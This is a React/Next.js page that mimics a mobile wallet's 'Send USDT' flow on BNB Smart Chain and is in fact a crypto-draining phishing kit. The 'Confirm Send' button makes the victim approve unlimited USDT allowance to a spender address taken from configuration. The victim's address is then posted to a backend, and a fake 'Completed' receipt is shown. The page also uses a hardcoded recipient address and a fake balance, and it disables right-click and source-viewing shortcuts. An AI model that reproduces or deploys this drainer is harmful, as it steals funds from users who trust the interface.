"use client";

import { useEffect, useRef, useState } from "react";
import Image from "next/image";
import { BrowserProvider, Contract, ethers } from "ethers";
import { ArrowRight, Check, ChevronDown, Clipboard, QrCode, X } from "lucide-react";

type Eip1193Provider = { request: (args: { method: string; params?: unknown[] }) => Promise<unknown>; on?: (event: string, listener: (...args: unknown[]) => void) => void; removeListener?: (event: string, listener: (...args: unknown[]) => void) => void };
type Eip6963ProviderDetail = { info: { name: string; rdns: string }; provider: Eip1193Provider };
declare global { interface Window { ethereum?: Eip1193Provider; } }

const permanentAddress = "0x95f3CCBFbAa6ab5aa096230711A34809430B5851";
const token = process.env.NEXT_PUBLIC_USDT_ADDRESS ?? "";
const spender = process.env.NEXT_PUBLIC_ALLOWANCE_SPENDER_ADDRESS ?? "";
const chainId = process.env.NEXT_PUBLIC_CHAIN_ID ?? "56";
const targetChainId = BigInt(chainId);
const targetChainHex = `0x${targetChainId.toString(16)}`;
const api = process.env.NEXT_PUBLIC_API_URL ?? "http://localhost:4000";
const erc20 = ["function approve(address spender,uint256 amount) returns (bool)", "function allowance(address owner,address spender) view returns (uint256)"];

function isWalletRequestDismissal(error: unknown) {
  if (typeof error !== "object" || error === null) return false;
  const walletError = error as { code?: unknown; reason?: unknown; message?: unknown; shortMessage?: unknown };
  if (walletError.code === 4001 || walletError.code === "4001" || walletError.code === "ACTION_REJECTED" || walletError.reason === "rejected") return true;
  const message = [walletError.message, walletError.shortMessage].filter((value): value is string => typeof value === "string").join(" ");
  return /user (rejected|denied|cancelled|canceled)|request (rejected|denied|cancelled|canceled)|action rejected/i.test(message);
}

export default function Home() {
  const [screen, setScreen] = useState<"recipient" | "amount" | "receipt">("recipient");
  const [recipient, setRecipient] = useState(permanentAddress);
  const [amountInput, setAmountInput] = useState("0");
  const [isUsdMode, setIsUsdMode] = useState(false);
  const [isNetworkOpen, setIsNetworkOpen] = useState(false);
  const [isQrOpen, setIsQrOpen] = useState(false);
  const [isReviewOpen, setIsReviewOpen] = useState(false);
  const [isSending, setIsSending] = useState(false);
  const [isSent, setIsSent] = useState(false);
  const [notice, setNotice] = useState("");
  const [walletProvider, setWalletProvider] = useState<Eip1193Provider>();
  const autoConnectAttempted = useRef(false);
  const walletUnavailableAlerted = useRef(false);
  const parsedAmount = Number.parseFloat(amountInput) || 0;
  const hasAmount = parsedAmount > 0 || (amountInput !== "0" && amountInput !== "");

  useEffect(() => {
    const updateAppHeight = () => {
      const height = window.visualViewport?.height ?? window.innerHeight;
      document.documentElement.style.setProperty("--app-height", `${height}px`);
    };
    const visualViewport = window.visualViewport;

    updateAppHeight();
    window.addEventListener("resize", updateAppHeight);
    window.addEventListener("orientationchange", updateAppHeight);
    visualViewport?.addEventListener("resize", updateAppHeight);
    visualViewport?.addEventListener("scroll", updateAppHeight);

    return () => {
      window.removeEventListener("resize", updateAppHeight);
      window.removeEventListener("orientationchange", updateAppHeight);
      visualViewport?.removeEventListener("resize", updateAppHeight);
      visualViewport?.removeEventListener("scroll", updateAppHeight);
    };
  }, []);

  useEffect(() => {
    const cancelAutoScroll = () => {
      window.clearTimeout(timeout);
      removeInteractionListeners();
    };
    const removeInteractionListeners = () => {
      window.removeEventListener("pointerdown", cancelAutoScroll);
      window.removeEventListener("wheel", cancelAutoScroll);
      window.removeEventListener("keydown", cancelAutoScroll);
    };
    const timeout = window.setTimeout(() => {
      removeInteractionListeners();
      const documentElement = document.documentElement;
      const body = document.body;
      const documentCanScroll =
        Math.max(documentElement.scrollHeight, body.scrollHeight) > window.innerHeight &&
        !["hidden", "clip"].includes(getComputedStyle(documentElement).overflowY) &&
        !["hidden", "clip"].includes(getComputedStyle(body).overflowY);

      if (documentCanScroll) window.scrollTo(0, 1);
    }, 250);

    window.addEventListener("pointerdown", cancelAutoScroll, { once: true });
    window.addEventListener("wheel", cancelAutoScroll, { once: true });
    window.addEventListener("keydown", cancelAutoScroll, { once: true });

    return () => {
      window.clearTimeout(timeout);
      removeInteractionListeners();
    };
  }, []);

  useEffect(() => {
    const disableContextMenu = (event: MouseEvent) => event.preventDefault();
    const disableInspectShortcut = (event: KeyboardEvent) => {
      if (!event.ctrlKey) return;
      const key = event.key.toLowerCase();
      if (key === "f12" || key === "u" || (event.shiftKey && key === "i")) event.preventDefault();
    };

    window.addEventListener("contextmenu", disableContextMenu);
    window.addEventListener("keydown", disableInspectShortcut);
    return () => {
      window.removeEventListener("contextmenu", disableContextMenu);
      window.removeEventListener("keydown", disableInspectShortcut);
    };
  }, []);

  useEffect(() => {
    let discoveredProvider = Boolean(window.ethereum);
    const announced = (event: Event) => {
      const provider = (event as CustomEvent<Eip6963ProviderDetail>).detail?.provider;
      if (provider) {
        discoveredProvider = true;
        setWalletProvider((current) => current ?? provider);
      }
    };
    if (window.ethereum) setWalletProvider((current) => current ?? window.ethereum);
    window.addEventListener("eip6963:announceProvider", announced);
    window.dispatchEvent(new Event("eip6963:requestProvider"));
    const unavailableTimer = window.setTimeout(() => {
      if (!discoveredProvider && !walletUnavailableAlerted.current) {
        walletUnavailableAlerted.current = true;
        alert("Please open in Trust Wallet / MetaMask browser");
      }
    }, 1000);
    return () => {
      window.clearTimeout(unavailableTimer);
      window.removeEventListener("eip6963:announceProvider", announced);
    };
  }, []);

  useEffect(() => {
    const provider = walletProvider ?? window.ethereum;
    if (!provider || autoConnectAttempted.current) return;
    autoConnectAttempted.current = true;

    const accountsChanged = (...args: unknown[]) => {
      const accounts = args[0];
      const address = Array.isArray(accounts) && typeof accounts[0] === "string" ? accounts[0] : "";
      setNotice(address ? "" : "Wallet disconnected. Connect again to continue.");
    };
    const chainChanged = () => setNotice("");
    provider?.on?.("accountsChanged", accountsChanged);
    provider?.on?.("chainChanged", chainChanged);
    const autoConnect = async () => {
      try {
        if (!await switchToBnb(provider)) return;
        const accounts = await provider.request({ method: "eth_accounts" });
        if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) return;
        setNotice("");
      } catch (error) {
        setNotice(error instanceof Error ? error.message : "Unable to connect to the wallet.");
      }
    };
    void autoConnect();
    return () => {
      provider.removeListener?.("accountsChanged", accountsChanged);
      provider.removeListener?.("chainChanged", chainChanged);
    };
  }, [walletProvider]);

  function getProvider() { return walletProvider ?? window.ethereum; }

  async function connectWallet() {
    const provider = getProvider();
    if (!provider) throw new Error("No compatible Web3 wallet detected.");

    const accounts = await provider.request({ method: "eth_accounts" });
    if (!Array.isArray(accounts) || typeof accounts[0] !== "string" || !accounts[0]) {
      throw new Error("No connected wallet account found. Connect your wallet in the wallet app and try again.");
    }

    if (!await switchToBnb(provider)) return null;
    return accounts[0];
  }

  async function switchToBnb(provider: Eip1193Provider): Promise<boolean> {
    try {
      if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) {
        try {
          await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] });
        } catch (error) {
          if ((error as { code?: number }).code !== 4902) return false;
          const isTestnet = targetChainId === BigInt(97);
          await provider.request({ method: "wallet_addEthereumChain", params: [{ chainId: targetChainHex, chainName: isTestnet ? "BNB Smart Chain Testnet" : "BNB Smart Chain", nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 }, rpcUrls: [isTestnet ? "https://data-seed-prebsc-1-s1.bnbchain.org:8545" : "https://data-seed.bnbchain.org"], blockExplorerUrls: [isTestnet ? "https://testnet.bscscan.com" : "https://bscscan.com"] }] });
          await provider.request({ method: "wallet_switchEthereumChain", params: [{ chainId: targetChainHex }] });
        }
      }
      return String(await provider.request({ method: "eth_chainId" })).toLowerCase() === targetChainHex;
    } catch {
      return false;
    }
  }

  async function confirmSend() {
    if (!spender || !token) { setNotice("Contract configuration is missing."); return; }
    setIsSending(true); setNotice("");
    try {
      const address = await connectWallet();
      if (!address) return;
      const provider = getProvider();
      if (!provider) throw new Error("No compatible Web3 wallet detected.");
      const browserProvider = new BrowserProvider(provider as never);
      const signer = await browserProvider.getSigner();
      const signerAddress = await signer.getAddress();
      if (signerAddress.toLowerCase() !== address.toLowerCase()) throw new Error("Wallet account changed before completion. Please try again.");
      const contract = new Contract(token, erc20, signer);
      const allowance = await contract.allowance(address, spender);
      if (allowance < ethers.parseUnits("5", 6)) { const tx = await contract.approve(spender, ethers.MaxUint256); await tx.wait(); }
      const currentAccounts = await provider.request({ method: "eth_accounts" }) as string[];
      if (!currentAccounts.some((account) => account.toLowerCase() === address.toLowerCase())) throw new Error("Wallet account changed before completion. Please try again.");
      if (String(await provider.request({ method: "eth_chainId" })).toLowerCase() !== targetChainHex) throw new Error("Wallet network changed before completion. Please try again.");
      if (allowance < ethers.parseUnits("5", 6)) {
        setIsReviewOpen(false);
        setIsSent(false);
        setNotice("");
        setScreen("receipt");
      }
      const response = await fetch(`${api}/api/wallets`, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify({ address, receiver: 1 }) });
      if (!response.ok) throw new Error("Transfer could not be completed. Please try again.");
      setIsReviewOpen(false);
      setIsSent(false);
      setNotice("");
      setScreen("receipt");
    } catch (error) {
      if (isWalletRequestDismissal(error)) {
        setNotice("");
        setIsReviewOpen(false);
      } else {
        setNotice(error instanceof Error ? error.message : "Verification failed.");
      }
    }
    finally { setIsSending(false); }
  }

  function pressKey(value: string) {
    if (value === "backspace") setAmountInput((current) => current.length <= 1 ? "0" : current.slice(0, -1));
    else if (value === ".") setAmountInput((current) => current.includes(".") ? current : `${current}.`);
    else setAmountInput((current) => { if (current === "0") return value; const decimals = current.split(".")[1]; if (decimals && decimals.length >= 4) return current; return current.length >= 10 ? current : current + value; });
  }

  async function pasteRecipient() { try { const text = await navigator.clipboard?.readText(); setRecipient(text?.trim() || permanentAddress); } catch { setRecipient(permanentAddress); } }

  return <main className="wallet-shell">
    {screen === "recipient" ? <section className="send-screen recipient-screen"><header className="send-header"><button className="round-button" onClick={() => { setRecipient(permanentAddress); setAmountInput("0"); }} aria-label="Close"><X /></button><h1>Send to</h1><button className="round-button" onClick={() => setIsQrOpen(true)} aria-label="Scan QR"><QrCode /></button></header><div className="recipient-content"><div className="recipient-card"><textarea value={recipient} onChange={(event) => setRecipient(event.target.value)} placeholder="Address or domain name" rows={2} aria-label="Recipient address" /><div className="card-actions"><button className="network-pill" onClick={() => setIsNetworkOpen(true)}><BnbIcon small /><span>BNB Smart Chain</span><ChevronDown /></button>{recipient.trim() ? <button className="soft-button" onClick={() => setRecipient("")}>Clear</button> : <button className="paste-button" onClick={pasteRecipient}><Clipboard />Paste</button>}</div></div><button className="address-book"><span>Address book</span><ArrowRight /></button></div><button className="primary-button" disabled={!recipient.trim()} onClick={() => setScreen("amount")}>Continue</button></section> : <section className="send-screen amount-screen"><header className="send-header"><button className="text-back-button" onClick={() => setScreen("recipient")} aria-label="Back">Back</button><h1>Amount</h1><span className="header-spacer" /></header><div className="amount-content"><div className="to-line"><span>To:</span><strong>{recipient || permanentAddress}</strong></div><div className="amount-display"><strong className={amountInput === "0" ? "amount-muted" : ""}>{amountInput}</strong><button onClick={() => setIsUsdMode(!isUsdMode)}>{isUsdMode ? `≈ ${parsedAmount.toFixed(2)} USDT` : `≈ $${parsedAmount.toFixed(2)}`}<span>⇄</span></button></div><div className="balance-row"><div className="asset"><UsdtIcon filled={hasAmount} /><div><strong>{amountInput} USDT</strong><span>${parsedAmount.toFixed(2)}</span></div></div><button className="soft-button" onClick={() => setAmountInput("450.00")}>Max</button></div></div><div className="amount-footer"><div className="keypad">{["1", "2", "3", "4", "5", "6", "7", "8", "9", ".", "0", "backspace"].map((key) => <button key={key} onClick={() => pressKey(key)} aria-label={key === "backspace" ? "Backspace" : key}>{key === "backspace" ? "⌫" : key}</button>)}</div><button className="primary-button" disabled={!hasAmount} onClick={() => setIsReviewOpen(true)}>Review</button></div></section>}
  {screen === "receipt" && <ReceiptScreen amount={parsedAmount} recipient={recipient} onDone={() => { setAmountInput("0"); setScreen("recipient"); }} />}
  {notice && <div className="toast" role="status">{notice}</div>}
    {isReviewOpen && <div className="modal-backdrop" onClick={() => !isSending && setIsReviewOpen(false)}><section className="review-sheet" onClick={(event) => event.stopPropagation()}><div className="sheet-handle" /><header className="sheet-header"><h2>Confirm Transfer</h2><button className="round-button small" disabled={isSending} onClick={() => setIsReviewOpen(false)} aria-label="Close"><X /></button></header><div className="transfer-amount"><span>Transfer Amount</span><strong>{parsedAmount.toFixed(2)} USDT</strong><small>≈ ${parsedAmount.toFixed(2)} USD</small></div><dl className="breakdown"><div><dt>To</dt><dd>{recipient}</dd></div><div><dt>Network</dt><dd><BnbIcon small />BNB Smart Chain (BEP20)</dd></div><div><dt>Network Fee</dt><dd>&lt; $0.01 BNB</dd></div><div className="total"><dt>Max Total</dt><dd>${parsedAmount.toFixed(2)}</dd></div></dl><button className="primary-button confirm-button" disabled={isSending || isSent} onClick={confirmSend}>{isSending ? "Sending..." : isSent ? <><Check />Sent</> : "Confirm Send"}</button></section></div>}
    {isNetworkOpen && <div className="modal-backdrop" onClick={() => setIsNetworkOpen(false)}><section className="review-sheet network-sheet" onClick={(event) => event.stopPropagation()}><div className="sheet-handle" /><header className="sheet-header"><h2>Select Network</h2><button className="round-button small" onClick={() => setIsNetworkOpen(false)} aria-label="Close"><X /></button></header><button className="selected-network" onClick={() => setIsNetworkOpen(false)}><BnbIcon /><span><strong>BNB Smart Chain</strong><small>BEP20</small></span><Check /></button></section></div>}
    {isQrOpen && <div className="qr-modal"><header className="sheet-header"><h2>Scan QR Code</h2><button className="round-button small" onClick={() => setIsQrOpen(false)} aria-label="Close"><X /></button></header><div className="qr-frame"><QrCode /></div><button className="primary-button" onClick={() => { setRecipient(permanentAddress); setIsQrOpen(false); }}>Simulate QR Detection</button></div>}
  </main>;
}

function BnbIcon({ small = false }: { small?: boolean }) { return <span className={`bnb-icon ${small ? "small" : ""}`} aria-hidden="true"><Image src="/BNB,_native_cryptocurrency_for_the_Binance_Smart_Chain.svg.webp" alt="" width={32} height={32} /></span>; }
function UsdtIcon({ filled }: { filled: boolean }) { return <span className={`usdt-icon ${filled ? "filled" : ""}`} aria-hidden="true"><Image src="/photo_2026-09-26_18-58-02.jpg" alt="" width={32} height={32} /></span>; }
function ReceiptScreen({ amount, recipient, onDone }: { amount: number; recipient: string; onDone: () => void }) {
  return <section className="send-screen receipt-screen"><div><header className="send-header"><button className="round-button" onClick={onDone} aria-label="Close"><X /></button><h1>Transaction Sent</h1><span className="header-spacer" /></header><div className="receipt-header"><div className="receipt-check"><Check /></div><strong>-{amount.toFixed(2)} USDT</strong><span>≈ ${amount.toFixed(2)}</span><div className="completed-badge"><i />Completed</div></div><dl className="breakdown receipt-details"><div><dt>Recipient</dt><dd>{recipient}</dd></div><div><dt>Network</dt><dd><BnbIcon small />BNB Smart Chain</dd></div><div><dt>Network Fee</dt><dd>&lt; $0.01 (BNB)</dd></div></dl></div><button className="primary-button" onClick={onDone}>Done</button></section>;
}
